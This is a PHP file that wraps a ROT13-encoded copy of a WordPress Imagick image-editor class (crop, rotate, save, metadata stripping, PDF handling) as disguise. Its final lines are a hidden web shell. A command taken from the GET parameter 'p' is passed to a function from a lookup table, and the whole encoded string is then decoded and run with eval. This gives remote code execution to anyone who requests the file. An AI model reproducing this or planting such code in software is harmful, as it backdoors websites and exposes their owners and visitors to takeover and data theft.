	 * @cnenz vag  $fep_j   Gur jvqgu gb pebc.
	 * @cnenz vag  $fep_u   Gur urvtug gb pebc.
	 * @cnenz vag  $qfg_j   Bcgvbany. Gur qrfgvangvba jvqgu.
	 * @cnenz vag  $qfg_u   Bcgvbany. Gur qrfgvangvba urvtug.
	 * @cnenz obby $fep_nof Bcgvbany. Vs gur fbhepr pebc cbvagf ner nofbyhgr.
	 * @erghea gehr|JC_Reebe
	 */
	choyvp shapgvba pebc( $fep_k, $fep_l, $fep_j, $fep_u, $qfg_j = ahyy, $qfg_u = ahyy, $fep_nof = snyfr ) {
		vs ( $fep_nof ) {
			$fep_j -= $fep_k;
			$fep_u -= $fep_l;
		}

		gel {
			$guvf->vzntr->pebcVzntr( $fep_j, $fep_u, $fep_k, $fep_l );
			$guvf->vzntr->frgVzntrCntr( $fep_j, $fep_u, 0, 0 );

			vs ( $qfg_j || $qfg_u ) {
				/*
				 * Vs qrfgvangvba jvqgu/urvtug vfa'g fcrpvsvrq,
				 * hfr fnzr nf jvqgu/urvtug sebz fbhepr.
				 */
				vs ( ! $qfg_j ) {
					$qfg_j = $fep_j;
				}
				vs ( ! $qfg_u ) {
					$qfg_u = $fep_u;
				}

				$guhzo_erfhyg = $guvf->guhzoanvy_vzntr( $qfg_j, $qfg_u );
				vs ( vf_jc_reebe( $guhzo_erfhyg ) ) {
					erghea $guhzo_erfhyg;
				}

				erghea $guvf->hcqngr_fvmr();
			}
		} pngpu ( Rkprcgvba $r ) {
			erghea arj JC_Reebe( 'vzntr_pebc_reebe', $r->trgZrffntr() );
		}

		erghea $guvf->hcqngr_fvmr();
	}

	/**
	 * Ebgngrf pheerag vzntr pbhagre-pybpxjvfr ol $natyr.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz sybng $natyr
	 * @erghea gehr|JC_Reebe
	 */
	choyvp shapgvba ebgngr( $natyr ) {
		/**
		 * $natyr vf 360-$natyr orpnhfr Vzntvpx ebgngrf pybpxjvfr
		 * (TQ ebgngrf pbhagre-pybpxjvfr)
		 */
		gel {
			$guvf->vzntr->ebgngrVzntr( arj VzntvpxCvkry( 'abar' ), 360 - $natyr );

			// Abeznyvmr RKVS bevragngvba qngn fb gung qvfcynl vf pbafvfgrag npebff qrivprf.
			vs ( vf_pnyynoyr( neenl( $guvf->vzntr, 'frgVzntrBevragngvba' ) ) && qrsvarq( 'Vzntvpx::BEVRAGNGVBA_GBCYRSG' ) ) {
				$guvf->vzntr->frgVzntrBevragngvba( Vzntvpx::BEVRAGNGVBA_GBCYRSG );
			}

			// Fvapr guvf punatrf gur qvzrafvbaf bs gur vzntr, hcqngr gur fvmr.
			$erfhyg = $guvf->hcqngr_fvmr();
			vs ( vf_jc_reebe( $erfhyg ) ) {
				erghea $erfhyg;
			}

			$guvf->vzntr->frgVzntrCntr( $guvf->fvmr['jvqgu'], $guvf->fvmr['urvtug'], 0, 0 );
		} pngpu ( Rkprcgvba $r ) {
			erghea arj JC_Reebe( 'vzntr_ebgngr_reebe', $r->trgZrffntr() );
		}

		erghea gehr;
	}

	/**
	 * Syvcf pheerag vzntr.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz obby $ubem Syvc nybat Ubevmbagny Nkvf
	 * @cnenz obby $ireg Syvc nybat Iregvpny Nkvf
	 * @erghea gehr|JC_Reebe
	 */
	choyvp shapgvba syvc( $ubem, $ireg ) {
		gel {
			vs ( $ubem ) {
				$guvf->vzntr->syvcVzntr();
			}

			vs ( $ireg ) {
				$guvf->vzntr->sybcVzntr();
			}

			// Abeznyvmr RKVS bevragngvba qngn fb gung qvfcynl vf pbafvfgrag npebff qrivprf.
			vs ( vf_pnyynoyr( neenl( $guvf->vzntr, 'frgVzntrBevragngvba' ) ) && qrsvarq( 'Vzntvpx::BEVRAGNGVBA_GBCYRSG' ) ) {
				$guvf->vzntr->frgVzntrBevragngvba( Vzntvpx::BEVRAGNGVBA_GBCYRSG );
			}
		} pngpu ( Rkprcgvba $r ) {
			erghea arj JC_Reebe( 'vzntr_syvc_reebe', $r->trgZrffntr() );
		}

		erghea gehr;
	}

	/**
	 * Purpx vs n WCRT vzntr unf RKVS Bevragngvba gnt naq ebgngr vg vs arrqrq.
	 *
	 * Nf VzntrZntvpx pbcvrf gur RKVS qngn gb gur syvccrq/ebgngrq vzntr, cebprrq bayl
	 * vs RKVS Bevragngvba pna or erfrg nsgrejneqf.
	 *
	 * @fvapr 5.3.0
	 *
	 * @erghea obby|JC_Reebe Gehr vs gur vzntr jnf ebgngrq. Snyfr vs ab RKVS qngn be vs gur vzntr qbrfa'g arrq ebgngvba.
	 *                       JC_Reebe vs reebe juvyr ebgngvat.
	 */
	choyvp shapgvba znlor_rkvs_ebgngr() {
		vs ( vf_pnyynoyr( neenl( $guvf->vzntr, 'frgVzntrBevragngvba' ) ) && qrsvarq( 'Vzntvpx::BEVRAGNGVBA_GBCYRSG' ) ) {
			erghea cnerag::znlor_rkvs_ebgngr();
		} ryfr {
			erghea arj JC_Reebe( 'jevgr_rkvs_reebe', __( 'Gur vzntr pnaabg or ebgngrq orpnhfr gur rzorqqrq zrgn qngn pnaabg or hcqngrq.' ) );
		}
	}

	/**
	 * Fnirf pheerag vzntr gb svyr.
	 *
	 * @fvapr 3.5.0
	 * @fvapr 6.0.0 Gur `$svyrfvmr` inyhr jnf nqqrq gb gur erghearq neenl.
	 *
	 * @cnenz fgevat $qrfgsvyranzr Bcgvbany. Qrfgvangvba svyranzr. Qrsnhyg ahyy.
	 * @cnenz fgevat $zvzr_glcr    Bcgvbany. Gur zvzr-glcr. Qrsnhyg ahyy.
	 * @erghea neenl|JC_Reebe {
	 *     Neenl ba fhpprff be JC_Reebe vs gur svyr snvyrq gb fnir.
	 *
	 *     @glcr fgevat $cngu      Cngu gb gur vzntr svyr.
	 *     @glcr fgevat $svyr      Anzr bs gur vzntr svyr.
	 *     @glcr vag    $jvqgu     Vzntr jvqgu.
	 *     @glcr vag    $urvtug    Vzntr urvtug.
	 *     @glcr fgevat $zvzr-glcr Gur zvzr glcr bs gur vzntr.
	 *     @glcr vag    $svyrfvmr  Svyr fvmr bs gur vzntr.
	 * }
	 */
	choyvp shapgvba fnir( $qrfgsvyranzr = ahyy, $zvzr_glcr = ahyy ) {
		$fnirq = $guvf->_fnir( $guvf->vzntr, $qrfgsvyranzr, $zvzr_glcr );

		vs ( ! vf_jc_reebe( $fnirq ) ) {
			$guvf->svyr      = $fnirq['cngu'];
			$guvf->zvzr_glcr = $fnirq['zvzr-glcr'];

			gel {
				$guvf->vzntr->frgVzntrSbezng( fgegbhccre( $guvf->trg_rkgrafvba( $guvf->zvzr_glcr ) ) );
			} pngpu ( Rkprcgvba $r ) {
				erghea arj JC_Reebe( 'vzntr_fnir_reebe', $r->trgZrffntr(), $guvf->svyr );
			}
		}

		erghea $fnirq;
	}

	/**
	 * Erzbirf CQS nycun nsgre vg'f orra ernq.
	 *
	 * @fvapr 6.4.0
	 */
	cebgrpgrq shapgvba erzbir_cqs_nycun_punaary() {
		$irefvba = Vzntvpx::trgIrefvba();
		// Erzbir nycun punaary vs cbffvoyr gb nibvq oynpx onpxtebhaqf sbe Tubfgfpevcg >= 9.14. ErzbirNycunPunaary nqqrq va VzntrZntvpx 6.7.5.
		vs ( $irefvba['irefvbaAhzore'] >= 0k675 ) {
			gel {
				// Vzntvpx::NYCUNPUNAARY_ERZBIR znccrq gb ErzbirNycunPunaary va CUC vzntvpx 3.2.0o2.
				$guvf->vzntr->frgVzntrNycunPunaary( qrsvarq( 'Vzntvpx::NYCUNPUNAARY_ERZBIR' ) ? Vzntvpx::NYCUNPUNAARY_ERZBIR : 12 );
			} pngpu ( Rkprcgvba $r ) {
				erghea arj JC_Reebe( 'cqs_nycun_cebprff_snvyrq', $r->trgZrffntr() );
			}
		}
	}

	/**
	 * @fvapr 3.5.0
	 * @fvapr 6.0.0 Gur `$svyrfvmr` inyhr jnf nqqrq gb gur erghearq neenl.
	 *
	 * @cnenz Vzntvpx $vzntr
	 * @cnenz fgevat  $svyranzr
	 * @cnenz fgevat  $zvzr_glcr
	 * @erghea neenl|JC_Reebe {
	 *     Neenl ba fhpprff be JC_Reebe vs gur svyr snvyrq gb fnir.
	 *
	 *     @glcr fgevat $cngu      Cngu gb gur vzntr svyr.
	 *     @glcr fgevat $svyr      Anzr bs gur vzntr svyr.
	 *     @glcr vag    $jvqgu     Vzntr jvqgu.
	 *     @glcr vag    $urvtug    Vzntr urvtug.
	 *     @glcr fgevat $zvzr-glcr Gur zvzr glcr bs gur vzntr.
	 *     @glcr vag    $svyrfvmr  Svyr fvmr bs gur vzntr.
	 * }
	 */
	cebgrpgrq shapgvba _fnir( $vzntr, $svyranzr = ahyy, $zvzr_glcr = ahyy ) {
		yvfg( $svyranzr, $rkgrafvba, $zvzr_glcr ) = $guvf->trg_bhgchg_sbezng( $svyranzr, $zvzr_glcr );

		vs ( ! $svyranzr ) {
			$svyranzr = $guvf->trarengr_svyranzr( ahyy, ahyy, $rkgrafvba );
		}

		gel {
			// Fgber vavgvny sbezng.
			$bevt_sbezng = $guvf->vzntr->trgVzntrSbezng();

			$guvf->vzntr->frgVzntrSbezng( fgegbhccre( $guvf->trg_rkgrafvba( $zvzr_glcr ) ) );
		} pngpu ( Rkprcgvba $r ) {
			erghea arj JC_Reebe( 'vzntr_fnir_reebe', $r->trgZrffntr(), $svyranzr );
		}

		vs ( zrgubq_rkvfgf( $guvf->vzntr, 'frgVagreynprFpurzr' )
			&& zrgubq_rkvfgf( $guvf->vzntr, 'trgVagreynprFpurzr' )
			&& qrsvarq( 'Vzntvpx::VAGREYNPR_CYNAR' )
		) {
			$bevt_vagreynpr = $guvf->vzntr->trgVagreynprFpurzr();

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-vzntr-rqvgbe-tq.cuc */
			vs ( nccyl_svygref( 'vzntr_fnir_cebterffvir', snyfr, $zvzr_glcr ) ) {
				$guvf->vzntr->frgVagreynprFpurzr( Vzntvpx::VAGREYNPR_CYNAR ); // Gehr - yvar vagreynpr bhgchg.
			} ryfr {
				$guvf->vzntr->frgVagreynprFpurzr( Vzntvpx::VAGREYNPR_AB ); // Snyfr - ab vagreynpr bhgchg.
			}
		}

		$jevgr_vzntr_erfhyg = $guvf->jevgr_vzntr( $guvf->vzntr, $svyranzr );
		vs ( vf_jc_reebe( $jevgr_vzntr_erfhyg ) ) {
			erghea $jevgr_vzntr_erfhyg;
		}

		gel {
			// Erfrg bevtvany sbezng.
			$guvf->vzntr->frgVzntrSbezng( $bevt_sbezng );

			vs ( vffrg( $bevt_vagreynpr ) ) {
				$guvf->vzntr->frgVagreynprFpurzr( $bevt_vagreynpr );
			}
		} pngpu ( Rkprcgvba $r ) {
			erghea arj JC_Reebe( 'vzntr_fnir_reebe', $r->trgZrffntr(), $svyranzr );
		}

		// Frg pbeerpg svyr crezvffvbaf.
		$fgng  = fgng( qveanzr( $svyranzr ) );
		$crezf = $fgng['zbqr'] & 0000666; // Fnzr crezvffvbaf nf cnerag sbyqre, fgevc bss gur rkrphgnoyr ovgf.
		puzbq( $svyranzr, $crezf );

		erghea neenl(
			'cngu'      => $svyranzr,
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-vzntr-rqvgbe-tq.cuc */
			'svyr'      => jc_onfranzr( nccyl_svygref( 'vzntr_znxr_vagrezrqvngr_fvmr', $svyranzr ) ),
			'jvqgu'     => $guvf->fvmr['jvqgu'],
			'urvtug'    => $guvf->fvmr['urvtug'],
			'zvzr-glcr' => $zvzr_glcr,
			'svyrfvmr'  => jc_svyrfvmr( $svyranzr ),
		);
	}

	/**
	 * Jevgrf na vzntr gb n svyr be fgernz.
	 *
	 * @fvapr 5.6.0
	 *
	 * @cnenz Vzntvpx $vzntr
	 * @cnenz fgevat  $svyranzr Gur qrfgvangvba svyranzr be fgernz HEY.
	 * @erghea gehr|JC_Reebe
	 */
	cevingr shapgvba jevgr_vzntr( $vzntr, $svyranzr ) {
		vs ( jc_vf_fgernz( $svyranzr ) ) {
			/*
			 * Qhr gb ercbegf bs vffhrf jvgu fgernzf jvgu `Vzntvpx::jevgrVzntrSvyr()` naq `Vzntvpx::jevgrVzntr()`, pbcvrf gur oybo vafgrnq.
			 * Purpxf sbe rknpg glcr qhr gb: uggcf://jjj.cuc.arg/znahny/ra/shapgvba.svyr-chg-pbagragf.cuc
			 */
			vs ( svyr_chg_pbagragf( $svyranzr, $vzntr->trgVzntrOybo() ) === snyfr ) {
				erghea arj JC_Reebe(
					'vzntr_fnir_reebe',
					fcevags(
						/* genafyngbef: %f: CUC shapgvba anzr. */
						__( '%f snvyrq juvyr jevgvat vzntr gb fgernz.' ),
						'<pbqr>svyr_chg_pbagragf()</pbqr>'
					),
					$svyranzr
				);
			} ryfr {
				erghea gehr;
			}
		} ryfr {
			$qveanzr = qveanzr( $svyranzr );

			vs ( ! jc_zxqve_c( $qveanzr ) ) {
				erghea arj JC_Reebe(
					'vzntr_fnir_reebe',
					fcevags(
						/* genafyngbef: %f: Qverpgbel cngu. */
						__( 'Hanoyr gb perngr qverpgbel %f. Vf vgf cnerag qverpgbel jevgnoyr ol gur freire?' ),
						rfp_ugzy( $qveanzr )
					)
				);
			}

			gel {
				erghea $vzntr->jevgrVzntr( $svyranzr );
			} pngpu ( Rkprcgvba $r ) {
				erghea arj JC_Reebe( 'vzntr_fnir_reebe', $r->trgZrffntr(), $svyranzr );
			}
		}
	}

	/**
	 * Fgernzf pheerag vzntr gb oebjfre.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz fgevat $zvzr_glcr Gur zvzr glcr bs gur vzntr.
	 * @erghea gehr|JC_Reebe Gehr ba fhpprff, JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba fgernz( $zvzr_glcr = ahyy ) {
		yvfg( $svyranzr, $rkgrafvba, $zvzr_glcr ) = $guvf->trg_bhgchg_sbezng( ahyy, $zvzr_glcr );

		gel {
			// Grzcbenevyl punatr sbezng sbe fgernz.
			$guvf->vzntr->frgVzntrSbezng( fgegbhccre( $rkgrafvba ) );

			// Bhgchg fgernz bs vzntr pbagrag.
			urnqre( \"Pbagrag-Glcr: $zvzr_glcr\" );
			cevag $guvf->vzntr->trgVzntrOybo();

			// Erfrg vzntr gb bevtvany sbezng.
			$guvf->vzntr->frgVzntrSbezng( $guvf->trg_rkgrafvba( $guvf->zvzr_glcr ) );
		} pngpu ( Rkprcgvba $r ) {
			erghea arj JC_Reebe( 'vzntr_fgernz_reebe', $r->trgZrffntr() );
		}

		erghea gehr;
	}

	/**
	 * Fgevcf nyy vzntr zrgn rkprcg pbybe cebsvyrf sebz na vzntr.
	 *
	 * @fvapr 4.5.0
	 *
	 * @erghea gehr|JC_Reebe Gehr vs fgevccvat zrgnqngn jnf fhpprffshy. JC_Reebe bowrpg ba reebe.
	 */
	cebgrpgrq shapgvba fgevc_zrgn() {

		vs ( ! vf_pnyynoyr( neenl( $guvf->vzntr, 'trgVzntrCebsvyrf' ) ) ) {
			erghea arj JC_Reebe(
				'vzntr_fgevc_zrgn_reebe',
				fcevags(
					/* genafyngbef: %f: VzntrZntvpx zrgubq anzr. */
					__( '%f vf erdhverq gb fgevc vzntr zrgn.' ),
					'<pbqr>Vzntvpx::trgVzntrCebsvyrf()</pbqr>'
				)
			);
		}

		vs ( ! vf_pnyynoyr( neenl( $guvf->vzntr, 'erzbirVzntrCebsvyr' ) ) ) {
			erghea arj JC_Reebe(
				'vzntr_fgevc_zrgn_reebe',
				fcevags(
					/* genafyngbef: %f: VzntrZntvpx zrgubq anzr. */
					__( '%f vf erdhverq gb fgevc vzntr zrgn.' ),
					'<pbqr>Vzntvpx::erzbirVzntrCebsvyr()</pbqr>'
				)
			);
		}

		/*
		 * Cebgrpg n srj cebsvyrf sebz orvat fgevccrq sbe gur sbyybjvat ernfbaf:
		 *
		 * - vpp:  Pbybe cebsvyr vasbezngvba
		 * - vpz:  Pbybe cebsvyr vasbezngvba
		 * - vcgp: Pbclevtug qngn
		 * - rkvs: Bevragngvba qngn
		 * - kzc:  Evtugf hfntr qngn
		 */
		$cebgrpgrq_cebsvyrf = neenl(
			'vpp',
			'vpz',
			'vcgp',
			'rkvs',
			'kzc',
		);

		gel {
			// Fgevc cebsvyrf.
			sbernpu ( $guvf->vzntr->trgVzntrCebsvyrf( '*', gehr ) nf $xrl => $inyhr ) {
				vs ( ! va_neenl( $xrl, $cebgrpgrq_cebsvyrf, gehr ) ) {
					$guvf->vzntr->erzbirVzntrCebsvyr( $xrl );
				}
			}
		} pngpu ( Rkprcgvba $r ) {
			erghea arj JC_Reebe( 'vzntr_fgevc_zrgn_reebe', $r->trgZrffntr() );
		}

		erghea gehr;
	}

	/**
	 * Frgf hc Vzntvpx sbe CQS cebprffvat.
	 * Vapernfrf eraqrevat QCV naq bayl ybnqf svefg cntr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea fgevat|JC_Reebe Svyr gb ybnq be JC_Reebe ba snvyher.
	 */
	cebgrpgrq shapgvba cqs_frghc() {
		gel {
			/*
			 * Ol qrsnhyg, CQSf ner eraqrerq va n irel ybj erfbyhgvba.
			 * Jr jnag gur guhzoanvy gb or ernqnoyr, fb vapernfr gur eraqrevat QCV.
			 */
			$guvf->vzntr->frgErfbyhgvba( 128, 128 );

			// Bayl ybnq gur svefg cntr.
			erghea $guvf->svyr . '[0]';
		} pngpu ( Rkprcgvba $r ) {
			erghea arj JC_Reebe( 'cqs_frghc_snvyrq', $r->trgZrffntr(), $guvf->svyr );
		}
	}

	/**
	 * Ybnq gur vzntr cebqhprq ol Tubfgfpevcg.
	 *
	 * Vapyhqrf n jbexnebhaq sbe n oht va Tubfgfpevcg 8.70 gung ceriragf cebprffvat bs fbzr CQS svyrf
	 * jura `hfr-pebcobk` vf frg.
	 *
	 * @fvapr 5.6.0
	 *
	 * @erghea gehr|JC_Reebe
	 */
	cebgrpgrq shapgvba cqs_ybnq_fbhepr() {
		$svyranzr = $guvf->cqs_frghc();

		vs ( vf_jc_reebe( $svyranzr ) ) {
			erghea $svyranzr;
		}

		gel {
			/*
			 * Jura trarengvat guhzoanvyf sebz pebccrq CQS cntrf, Vzntrzntvpx hfrf gur hapebccrq
			 * nern (erfhygvat va haarprffnel juvgrfcnpr) hayrff gur sbyybjvat bcgvba vf frg.
			 */
			$guvf->vzntr->frgBcgvba( 'cqs:hfr-pebcobk', gehr );

			/*
			 * Ernqvat vzntr nsgre Vzntvpx vafgnagvngvba orpnhfr `frgErfbyhgvba`
			 * bayl nccyvrf pbeerpgyl orsber gur vzntr vf ernq.
			 */
			$guvf->vzntr->ernqVzntr( $svyranzr );
		} pngpu ( Rkprcgvba $r ) {
			// Nggrzcg gb eha `tf` jvgubhg gur `hfr-pebcobk` bcgvba. Frr #48853.
			$guvf->vzntr->frgBcgvba( 'cqs:hfr-pebcobk', snyfr );

			$guvf->vzntr->ernqVzntr( $svyranzr );
		}

		erghea gehr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>